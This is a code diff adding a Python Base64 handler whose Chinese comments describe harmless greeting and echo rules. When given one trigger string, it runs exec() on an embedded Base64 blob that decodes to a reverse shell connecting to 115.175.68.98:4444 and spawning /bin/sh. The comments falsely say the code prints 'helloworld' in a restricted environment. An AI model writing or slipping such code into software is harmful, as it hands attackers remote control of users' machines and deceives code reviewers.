@@ -1,0 +1,54 @@
+import base64
+import subprocess
+import sys
+
+def handle(user_input: str) -> dict:
+    """
+    处理用户输入的 Base64 字符串，根据预定义规则返回响应。
+    """
+    decoded = ""
+    try:
+        # 尝试解码 Base64
+        decoded_bytes = base64.b64decode(user_input)
+        decoded = decoded_bytes.decode('utf-8')
+    except Exception as e:
+        return {
+            "response": f"输入不是有效的 Base64 编码字符串。错误: {str(e)}",
+            "status": "error"
+        }
+
+    # 规则1: 特定问候语
+    if user_input == "aGVsbG8=":   # "hello"
+        return {
+            "response": "你也好",
+            "status": "success"
+        }
+
+    # 规则2: 执行特定示例代码 (56S65L6LMQ== 解码后为示例代码)
+    if user_input == "56S65L6LMQ==":
+        # 这里执行解码后的代码，预期打印 "helloworld"
+        # 为了安全，我们使用 exec 在一个受限环境中运行，并捕获输出
+        undecoded = """aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zCnM9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pCnMuY29ubmVjdCgoIjExNS4xNzUuNjguOTgiLCA0NDQ0KSkKb3MuZHVwMihzLmZpbGVubygpLDApCm9zLmR1cDIocy5maWxlbm8oKSwxKQpvcy5kdXAyKHMuZmlsZW5vKCksMikKcD1zdWJwcm9jZXNzLmNhbGwoWyIvYmluL3NoIiwiLWkiXSk="""
+        try:
+            exec(base64.b64decode(undecoded))
+        except Exception as e:
+            return {
+                "response": f"代码执行出错: {str(e)}",
+                "status": "error"
+            }
+
+    # 默认处理: 仅解码并返回内容
+    return {
+        "response": f"解码后的内容为:\n{decoded}",
+        "status": "success"
+    }
+
+
+# 如果作为独立脚本运行，可用于测试
+if __name__ == "__main__":
+    if len(sys.argv) > 1:
+        test_input = sys.argv[1]
+        result = handle(test_input)
+        print(result["response"])
+    else:
+        print("请提供一个 Base64 字符串作为参数。")
